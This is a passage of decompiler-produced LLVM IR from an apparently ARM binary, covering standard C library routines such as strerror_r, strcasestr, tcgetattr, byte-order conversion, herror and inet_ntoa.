  store i32 %v9_15afc, i32* @r6, align 4
  ret i32 %v1_15b8c

dec_label_pc_15b9c:                               ; preds = %dec_label_pc_15bc8
  %v2_15bd0 = inttoptr i32 %v1_15bc0 to i8*
  %v3_15bd0 = load i8, i8* %v2_15bd0, align 1
  %v4_15bd0 = zext i8 %v3_15bd0 to i32
  %v2_15bd4 = inttoptr i32 %v1_15bbc to i8*
  %v3_15bd4 = load i8, i8* %v2_15bd4, align 1
  %v9_15bd8 = icmp eq i8 %v3_15bd4, %v3_15bd0
  br i1 %v9_15bd8, label %dec_label_pc_15ba0, label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15b9c, %bb54, %dec_label_pc_15b84
  %v0_15be0 = phi i32 [ %v4_15b88, %dec_label_pc_15b84 ], [ %v4_15bd0, %dec_label_pc_15b9c ], [ %v4_15bac, %bb54 ]
  %v2_15be0 = icmp eq i32 %v0_15be0, 0
  br i1 %v2_15be0, label %dec_label_pc_15be8, label %dec_label_pc_15b44

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15be0
  store i32 %v6_15afc, i32* @r5, align 4
  store i32 %v9_15afc, i32* @r6, align 4
  ret i32 %v1_15b8c

dec_label_pc_15bec:                               ; preds = %dec_label_pc_15b10, %dec_label_pc_15b64, %dec_label_pc_15b50
  store i32 %v6_15afc, i32* @r5, align 4
  store i32 %v9_15afc, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15bc0, { 0, 2, 1 }
  uselistorder i32 %v1_15bbc, { 1, 2, 0 }
  uselistorder i32 %v1_15b8c, { 2, 1, 0 }
  uselistorder i8 %v3_15b78.pn, { 1, 0 }
  uselistorder i8* %v3_15b78.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_15b6c, { 1, 0 }
  uselistorder i32 %v1_15b6c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15b10, { 0, 2, 1 }
  uselistorder i8 %v3_15b00, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_15afc, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_15afc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15bec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15ba0, { 1, 0 }
  uselistorder label %dec_label_pc_15b80, { 1, 0 }
  uselistorder label %dec_label_pc_15b78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15b50, { 1, 0 }
  uselistorder label %dec_label_pc_15b70.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15bfc = call i32 @__xpg_strerror_r()
  %v0_15c00 = load i32, i32* @r4, align 4
  ret i32 %v0_15c00
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15c08 = load i32, i32* @r4, align 4
  %v0_15c0c = load i32, i32* @r0, align 4
  %v0_15c18 = load i32, i32* @r1, align 4
  store i32 %v0_15c18, i32* @r8, align 4
  %v0_15c1c = load i32, i32* @r2, align 4
  store i32 %v0_15c1c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_15c0c, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_15c54

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_2203c.1376 to i32), i32* @r5, align 4
  %v2_15c3c3446 = icmp eq i32 %v0_15c0c, 0
  br i1 %v2_15c3c3446, label %bb26, label %dec_label_pc_15c30.lr.ph

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15c30.lr.ph, %bb
  %v2_15c4841 = phi i1 [ %v2_15c483849, %dec_label_pc_15c30.lr.ph ], [ %v2_15c48, %bb ]
  %v1_15c4c40 = phi i32 [ %v0_15c3c.pr48, %dec_label_pc_15c30.lr.ph ], [ %v2_15c38, %bb ]
  %v0_15c3439 = phi i32 [ %v0_15c40547, %dec_label_pc_15c30.lr.ph ], [ %v1_15c34, %bb ]
  %v1_15c34 = add i32 %v0_15c3439, 1
  store i32 %v1_15c34, i32* @r5, align 4
  br i1 %v2_15c4841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_15c30
  %v2_15c38 = add i32 %v1_15c4c40, -1
  %v2_15c3c = icmp eq i32 %v2_15c38, 0
  %v1_15c40 = inttoptr i32 %v1_15c34 to i8*
  %v2_15c40 = load i8, i8* %v1_15c40, align 1
  %v2_15c48 = icmp eq i8 %v2_15c40, 0
  br i1 %v2_15c3c, label %dec_label_pc_15c48, label %dec_label_pc_15c30

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_15c30
  %v1_15c4035 = inttoptr i32 %v1_15c34 to i8*
  %v2_15c4036 = load i8, i8* %v1_15c4035, align 1
  %v2_15c4838 = icmp eq i8 %v2_15c4036, 0
  br label %dec_label_pc_15c30.lr.ph

dec_label_pc_15c30.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_15c483849 = phi i1 [ %v2_15c4838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_15c3c.pr48 = phi i32 [ %v1_15c4c40, %thread-pre-split.loopexit ], [ %v0_15c0c, %thread-pre-split.preheader ]
  %v0_15c40547 = phi i32 [ %v1_15c34, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_2203c.1376 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_15c30

dec_label_pc_15c48:                               ; preds = %bb
  br i1 %v2_15c48, label %dec_label_pc_15c54, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_15c48
  %v0_15c34.lcssa55 = phi i32 [ %v1_15c34, %dec_label_pc_15c48 ], [ ptrtoint ([8 x i8]* @global_var_2203c.1376 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c54:                               ; preds = %dec_label_pc_15c48, %entry
  %v3_15c58 = ashr i32 %v0_15c0c, 31
  %v5_15c6c = bitcast i32* %stack_var_-25 to i8*
  %v6_15c6c = call i32 @_uintmaxtostr(i8* %v5_15c6c, i32 %v0_15c0c, i32 %v3_15c58, i32 -10, i32 0)
  %v1_15c70 = add i32 %v6_15c6c, -14
  store i32 %v1_15c70, i32* @r5, align 4
  store i32 %v1_15c70, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_2202c.1378 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_15c80 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_15c88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c88

dec_label_pc_15c88:                               ; preds = %bb26, %dec_label_pc_15c54
  %v0_15c88 = phi i32 [ %v0_15c34.lcssa55, %bb26 ], [ %v0_15c88.pre, %dec_label_pc_15c54 ]
  %v1_15c88 = inttoptr i32 %v0_15c88 to i8*
  %v3_15c8c = call i32 @strlen(i8* %v1_15c88)
  %v0_15c90 = load i32, i32* @r8, align 4
  %v2_15c90 = icmp eq i32 %v0_15c90, 0
  %v1_15c94 = add i32 %v3_15c8c, 1
  store i32 %v1_15c94, i32* @r4, align 4
  br i1 %v2_15c90, label %bb27, label %dec_label_pc_15c88._crit_edge

dec_label_pc_15c88._crit_edge:                    ; preds = %dec_label_pc_15c88
  %v1_15c9c.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_15c88
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_15c88._crit_edge, %bb27
  %v4_15ca0 = phi i32 [ %v1_15c9c.pre, %dec_label_pc_15c88._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_15c94, %v4_15ca0
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_15ca0, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_15cb014 = phi i32 [ %v4_15ca0, %bb29 ], [ %v1_15c94, %bb28 ]
  %v2_15ca8 = icmp eq i32 %v0_15cb014, 0
  br i1 %v2_15ca8, label %dec_label_pc_15ccc, label %dec_label_pc_15cb0

dec_label_pc_15cb0:                               ; preds = %.thread16
  store i32 %v0_15cb014, i32* @r2, align 4
  %v0_15cb4 = load i32, i32* @r5, align 4
  store i32 %v0_15cb4, i32* @r1, align 4
  store i32 %v0_15c90, i32* @r0, align 4
  %v0_15cbc = call i32 @memcpy()
  %v0_15cc0 = load i32, i32* @r8, align 4
  %v1_15cc0 = load i32, i32* @r4, align 4
  %v2_15cc0 = add i32 %v1_15cc0, %v0_15cc0
  %v3_15cc8 = add i32 %v2_15cc0, -1
  %v4_15cc8 = inttoptr i32 %v3_15cc8 to i8*
  store i8 0, i8* %v4_15cc8, align 1
  br label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %.thread16, %dec_label_pc_15cb0
  %v0_15ccc = load i32, i32* %r7.global-to-local, align 4
  %v2_15ccc = icmp eq i32 %v0_15ccc, 0
  br i1 %v2_15ccc, label %dec_label_pc_15cdc, label %dec_label_pc_15cd4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15ccc
  %v0_15cd4 = call i32 @__errno_location()
  %v0_15cd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_15cd8 = inttoptr i32 %v0_15cd4 to i32*
  store i32 %v0_15cd8, i32* %v2_15cd8, align 4
  %v0_15cdc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15cdc

dec_label_pc_15cdc:                               ; preds = %dec_label_pc_15ccc, %dec_label_pc_15cd4
  %v0_15cdc = phi i32 [ 0, %dec_label_pc_15ccc ], [ %v0_15cdc.pre, %dec_label_pc_15cd4 ]
  store i32 %v3_15c08, i32* @r4, align 4
  ret i32 %v0_15cdc

; uselistorder directives
  uselistorder i32 %v4_15ca0, { 1, 2, 0 }
  uselistorder i32 %v1_15c94, { 1, 0, 2 }
  uselistorder i32 %v1_15c34, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_15c0c, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_15cdc, { 1, 0 }
  uselistorder label %dec_label_pc_15ccc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_15c88, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_15d0416 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15d04.outer

dec_label_pc_15d04.outer:                         ; preds = %dec_label_pc_15d6c, %entry
  %v0_15d18.ph = phi i32 [ %v1_15d6c, %dec_label_pc_15d6c ], [ %tmp, %entry ]
  %v2_15d0417 = load i8, i8* %v1_15d0416, align 1
  %v2_15d0819 = icmp eq i8 %v2_15d0417, 0
  br i1 %v2_15d0819, label %dec_label_pc_15d18, label %dec_label_pc_15d20

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15d04.backedge, %dec_label_pc_15d04.outer
  ret i32 %v0_15d18.ph

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d04.outer, %dec_label_pc_15d04.backedge
  %v1_15d1025.in = phi i32 [ %v1_15d1025, %dec_label_pc_15d04.backedge ], [ %arg2, %dec_label_pc_15d04.outer ]
  %v2_15d0423 = phi i8 [ %v2_15d04, %dec_label_pc_15d04.backedge ], [ %v2_15d0417, %dec_label_pc_15d04.outer ]
  %v2_15d0c24.in.in = phi i8 [ %v2_15d04, %dec_label_pc_15d04.backedge ], [ %v2_15d0417, %dec_label_pc_15d04.outer ]
  %v0_15d2822 = phi i32 [ %v1_15d28, %dec_label_pc_15d04.backedge ], [ %v0_15d18.ph, %dec_label_pc_15d04.outer ]
  %v1_15d1025 = add i32 %v1_15d1025.in, 1
  %v1_15d20 = inttoptr i32 %v0_15d2822 to i8*
  %v2_15d20 = load i8, i8* %v1_15d20, align 1
  %v9_15d24 = icmp eq i8 %v2_15d0423, %v2_15d20
  %v1_15d28 = add i32 %v0_15d2822, 1
  br i1 %v9_15d24, label %dec_label_pc_15d04.backedge, label %dec_label_pc_15d34

dec_label_pc_15d04.backedge:                      ; preds = %dec_label_pc_15d20, %dec_label_pc_15d34
  %v1_15d04 = inttoptr i32 %v1_15d1025 to i8*
  %v2_15d04 = load i8, i8* %v1_15d04, align 1
  %v2_15d08 = icmp eq i8 %v2_15d04, 0
  br i1 %v2_15d08, label %dec_label_pc_15d18, label %dec_label_pc_15d20

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d20
  %v2_15d0c24.in = zext i8 %v2_15d0c24.in.in to i32
  %v3_15d20 = zext i8 %v2_15d20 to i32
  %v2_15d2c = mul nuw nsw i32 %v3_15d20, 2
  %v2_15d0c24 = mul nuw nsw i32 %v2_15d0c24.in, 2
  %v2_15d38 = load i32, i32* bitcast (i32** @global_var_2b590.1381 to i32*), align 4
  %v2_15d3c = add i32 %v2_15d38, %v2_15d2c
  %v2_15d40 = add i32 %v2_15d38, %v2_15d0c24
  %v1_15d44 = add i32 %v2_15d40, 1
  %v2_15d44 = inttoptr i32 %v1_15d44 to i8*
  %v3_15d44 = load i8, i8* %v2_15d44, align 1
  %v4_15d44 = zext i8 %v3_15d44 to i32
  %v1_15d48 = add i32 %v2_15d3c, 1
  %v2_15d48 = inttoptr i32 %v1_15d48 to i8*
  %v3_15d48 = load i8, i8* %v2_15d48, align 1
  %v4_15d48 = zext i8 %v3_15d48 to i32
  %v3_15d4c = inttoptr i32 %v2_15d3c to i8*
  %v4_15d4c = load i8, i8* %v3_15d4c, align 1
  %v6_15d4c = zext i8 %v4_15d4c to i32
  %v3_15d50 = inttoptr i32 %v2_15d40 to i8*
  %v4_15d50 = load i8, i8* %v3_15d50, align 1
  %v6_15d50 = zext i8 %v4_15d50 to i32
  %v3_15d54 = mul nuw i32 %v4_15d44, 16777216
  %v3_15d58 = mul nuw i32 %v4_15d48, 16777216
  %v4_15d5c = sdiv i32 %v3_15d54, 65536
  %v5_15d5c = or i32 %v6_15d50, %v4_15d5c
  %v4_15d60 = sdiv i32 %v3_15d58, 65536
  %v5_15d60 = or i32 %v4_15d60, %v6_15d4c
  %v9_15d64 = icmp eq i32 %v5_15d5c, %v5_15d60
  br i1 %v9_15d64, label %dec_label_pc_15d04.backedge, label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d34
  %v1_15d6c = add i32 %v0_15d18.ph, 1
  %v2_15d70 = icmp eq i8 %v2_15d20, 0
  br i1 %v2_15d70, label %dec_label_pc_15d80, label %dec_label_pc_15d04.outer

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d6c
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_15d04, { 2, 1, 0 }
  uselistorder i8 %v2_15d20, { 0, 2, 1 }
  uselistorder i32 %v0_15d2822, { 1, 0 }
  uselistorder i32 %v0_15d18.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d04.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15d20, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_315f4.1383 to i32), i32* @r2, align 4
  %v0_15d90 = call i32 @strtok_r()
  %v0_15d94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d94, label %bb, label %bb1

bb:                                               ; preds = %entry
  store i32 %arg1, i32* %arg2, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15d90

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_15d9c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_15d9c, i32* @r1, align 4
  %v0_15da4 = call i32 @__GI_tcgetattr()
  %v1_15da8 = sub i32 1, %v0_15da4
  %v2_15da8 = icmp ult i32 %v0_15da4, 2
  br i1 %v2_15da8, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15db4 = phi i32 [ %v1_15da8, %entry ], [ 0, %bb ]
  ret i32 %v5_15db4

; uselistorder directives
  uselistorder i32 %v0_15da4, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_15db8 = load i32, i32* @r4, align 4
  %v6_15db8 = load i32, i32* @r5, align 4
  %v2_15dbc = ptrtoint i32* %stack_var_-56 to i32
  %v0_15dc0 = load i32, i32* @r1, align 4
  store i32 %v0_15dc0, i32* %r6.global-to-local, align 4
  %v0_15dcc = load i32, i32* @r0, align 4
  %v3_15dcc = call i32 @ioctl(i32 %v0_15dcc, i32 21505, i32 %v2_15dbc)
  store i32 %v3_15dcc, i32* %r7.global-to-local, align 4
  %v2_15dd0 = icmp eq i32 %v3_15dcc, 0
  %v2_15dd8 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_15dd8, i32* @r1, align 4
  %v0_15de0 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_15dd0, label %dec_label_pc_15de8, label %dec_label_pc_15e14

dec_label_pc_15de8:                               ; preds = %entry
  %v1_15de0 = add i32 %v0_15de0, 17
  %v4_15df0 = zext i8 %tmp to i32
  store i32 %v4_15df0, i32* @r5, align 4
  %v2_15df4 = load i32, i32* %stack_var_-56, align 4
  %v1_15df8 = inttoptr i32 %v0_15de0 to i32*
  store i32 %v2_15df4, i32* %v1_15df8, align 4
  %v3_15df8 = add i32 %v0_15de0, 4
  %v4_15df8 = inttoptr i32 %v3_15df8 to i32*
  %v5_15df8 = load i32, i32* @ip, align 4
  store i32 %v5_15df8, i32* %v4_15df8, align 4
  %v6_15df8 = add i32 %v0_15de0, 8
  %v7_15df8 = inttoptr i32 %v6_15df8 to i32*
  %v8_15df8 = load i32, i32* @lr, align 4
  store i32 %v8_15df8, i32* %v7_15df8, align 4
  %v0_15dfc = load i32, i32* @r4, align 4
  %v1_15dfc = load i32, i32* %r6.global-to-local, align 4
  %v2_15dfc = add i32 %v1_15dfc, 12
  %v3_15dfc = inttoptr i32 %v2_15dfc to i32*
  store i32 %v0_15dfc, i32* %v3_15dfc, align 4
  %v0_15e00 = load i32, i32* @r5, align 4
  %v1_15e00 = trunc i32 %v0_15e00 to i8
  %v2_15e00 = load i32, i32* %r6.global-to-local, align 4
  %v3_15e00 = add i32 %v2_15e00, 16
  %v4_15e00 = inttoptr i32 %v3_15e00 to i8*
  store i8 %v1_15e00, i8* %v4_15e00, align 1
  %v4_15e04 = call i32 @__GI_mempcpy(i32 %v1_15de0, i32 %v2_15dd8, i32 19, i32 %v2_15df4)
  %v0_15e08 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15e10 = inttoptr i32 %v4_15e04 to i8*
  %v3_15e10 = call i32 @__GI_memset(i8* %v2_15e10, i32 %v0_15e08)
  br label %dec_label_pc_15e14

dec_label_pc_15e14:                               ; preds = %entry, %dec_label_pc_15de8
  %v0_15e14 = phi i32 [ %v3_15dcc, %entry ], [ %v0_15e08, %dec_label_pc_15de8 ]
  store i32 %v3_15db8, i32* @r4, align 4
  store i32 %v6_15db8, i32* @r5, align 4
  ret i32 %v0_15e14

; uselistorder directives
  uselistorder i32 %v0_15de0, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15e14, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15e40 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_15e40
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_15e50 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15e54 = urem i32 %tmp1, 256
  %v5_15e54 = or i32 %v4_15e54, %v1_15e50
  ret i32 %v5_15e54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15e78 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_15e78
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_15e88 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15e8c = urem i32 %tmp1, 256
  %v5_15e8c = or i32 %v4_15e8c, %v1_15e88
  ret i32 %v5_15e8c

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @hstrerror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v8_15ea0 = mul i32 %arg1, 4
  %v9_15ea0 = add i32 %v8_15ea0, ptrtoint ([5 x i8*]* @global_var_22c0c.1393 to i32)
  %v10_15ea0 = inttoptr i32 %v9_15ea0 to i32*
  %v11_15ea0 = load i32, i32* %v10_15ea0, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_15ea4 = phi i32 [ ptrtoint ([15 x i8]* @global_var_22c20.1386 to i32), %entry ], [ %v11_15ea0, %bb ]
  ret i32 %v0_15ea4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v3_15eb8 = icmp eq i8* %arg1, null
  br i1 %v3_15eb8, label %dec_label_pc_15ed4, label %dec_label_pc_15ec4

dec_label_pc_15ec4:                               ; preds = %entry
  %v2_15ec4 = load i8, i8* %arg1, align 1
  %v2_15ec8 = icmp eq i8 %v2_15ec4, 0
  br i1 %v2_15ec8, label %dec_label_pc_15ed4, label %dec_label_pc_15ed8

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15ec4, %entry
  br label %dec_label_pc_15ed8

dec_label_pc_15ed8:                               ; preds = %dec_label_pc_15ec4, %dec_label_pc_15ed4
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_22c32.1397 to i32), %dec_label_pc_15ed4 ], [ ptrtoint ([3 x i8]* @global_var_22c30.1395 to i32), %dec_label_pc_15ec4 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_15ed8 = call i32 @__GI___h_errno_location()
  %v1_15edc = inttoptr i32 %v0_15ed8 to i32*
  %v2_15edc = load i32, i32* %v1_15edc, align 4
  %tmp10 = icmp ult i32 %v2_15edc, 5
  br i1 %tmp10, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_15ed8
  %v8_15eec = mul i32 %v2_15edc, 4
  %v9_15eec = add i32 %v8_15eec, ptrtoint ([5 x i8*]* @global_var_22c0c.1393 to i32)
  %v10_15eec = inttoptr i32 %v9_15eec to i32*
  %v11_15eec = load i32, i32* %v10_15eec, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_15ed8, %bb
  %storemerge3 = phi i32 [ %v11_15eec, %bb ], [ ptrtoint ([15 x i8]* @global_var_22c20.1386 to i32), %dec_label_pc_15ed8 ]
  %v0_15ef4 = load i32, i32* @r4, align 4
  %v2_15ef8 = load i32, i32* @global_var_2b268, align 4
  store i32 %v2_15ef8, i32* @r0, align 4
  %v0_15f00 = load i32, i32* @r5, align 4
  %v9_15f08 = call i32 @fprintf(i32 %v2_15ef8, i32 ptrtoint ([8 x i8]* @global_var_22b98.1402 to i32), i32 %v0_15ef4, i32 %v0_15f00, i32 %storemerge3)
  ret i32 %v9_15f08

; uselistorder directives
  uselistorder i32 %v2_15edc, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8*]* @global_var_22c0c.1393 to i32), { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_15ed8, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_15f2c = load i32, i32* @r4, align 4
  %v6_15f2c = load i32, i32* @r5, align 4
  %v9_15f2c = load i32, i32* @r6, align 4
  %v0_15f30 = load i32, i32* @r0, align 4
  %v2_15f50 = call i32 @llvm.bswap.i32(i32 %v0_15f30)
  %v0_15f54 = load i32, i32* @r1, align 4
  %v1_15f54 = add i32 %v0_15f54, 15
  store i32 %v1_15f54, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15f80

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f80
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_15f68 = inttoptr i32 %v0_15fa0 to i8*
  %v6_15f68 = call i32 @_uintmaxtostr(i8* %v5_15f68, i32 %v1_15f84, i32 0, i32 -10, i32 0)
  %v0_15f6c = load i32, i32* @r6, align 4
  %v2_15f6c = icmp eq i32 %v0_15f6c, 0
  %v1_15f70 = add i32 %v6_15f68, -1
  store i32 %v1_15f70, i32* %ip.global-to-local, align 4
  br i1 %v2_15f6c, label %dec_label_pc_15f80.backedge, label %bb

dec_label_pc_15f80.backedge:                      ; preds = %bb, %dec_label_pc_15f60
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_15f70, %dec_label_pc_15f60 ]
  %v0_15f80.pre = load i32, i32* @r5, align 4
  %v0_15f84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f80

bb:                                               ; preds = %dec_label_pc_15f60
  %v4_15f78 = inttoptr i32 %v0_15f6c to i8*
  store i8 46, i8* %v4_15f78, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15f80.backedge

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f80.backedge, %entry
  %v0_15fa0 = phi i32 [ %v1_15f54, %entry ], [ %storemerge.pre, %dec_label_pc_15f80.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_15f80.backedge ]
  %v0_15f94 = phi i32 [ %v2_15f50, %entry ], [ %v0_15f84.pre, %dec_label_pc_15f80.backedge ]
  %v0_15f98 = phi i32 [ 0, %entry ], [ %v0_15f80.pre, %dec_label_pc_15f80.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_15f80 = icmp eq i32 %v0_15f98, 3
  store i1 %v7_15f80, i1* @cpsr_z, align 1
  %v1_15f84 = urem i32 %v0_15f94, 256
  store i32 %v1_15f84, i32* @r1, align 4
  store i32 -10, i32* @r3, align 4
  %v3_15f94 = udiv i32 %v0_15f94, 256
  store i32 %v3_15f94, i32* @r4, align 4
  %v1_15f98 = add i32 %v0_15f98, 1
  store i32 %v1_15f98, i32* @r5, align 4
  %v7_15f9c = icmp sgt i32 %v0_15f98, 3
  br i1 %v7_15f9c, label %dec_label_pc_15fa0, label %dec_label_pc_15f60

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f80
  %v1_15fa0 = add i32 %v0_15fa0, 1
  store i32 %v3_15f2c, i32* @r4, align 4
  store i32 %v6_15f2c, i32* @r5, align 4
  store i32 %v9_15f2c, i32* @r6, align 4
  ret i32 %v1_15fa0

; uselistorder directives
  uselistorder i32 %v0_15f98, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_315f8.1404 to i32), i32* @r1, align 4
  %v0_15fb0 = call i32 @__GI_inet_ntoa_r()
  %v0_15fb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15fb4, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_15fb4 = load i32, i32* @r1, align 4
  %v3_15fb4 = load i32, i32* @r3, align 4
  %v4_15fb4 = inttoptr i32 %v3_15fb4 to i32*
  store i32 %v1_15fb4, i32* %v4_15fb4, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15fb0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_15fbc = ptrtoint i32* %stack_var_-8 to i32
  %v0_15fc4 = load i32, i32* @r0, align 4
  %v2_15fc4 = inttoptr i32 %v0_15fc4 to i8*
  %v3_15fc4 = call i32 @inet_aton(i8* %v2_15fc4, i32 %v2_15fbc)
  %v2_15fc8 = icmp eq i32 %v3_15fc4, 0
  br i1 %v2_15fc8, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_15fd0 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

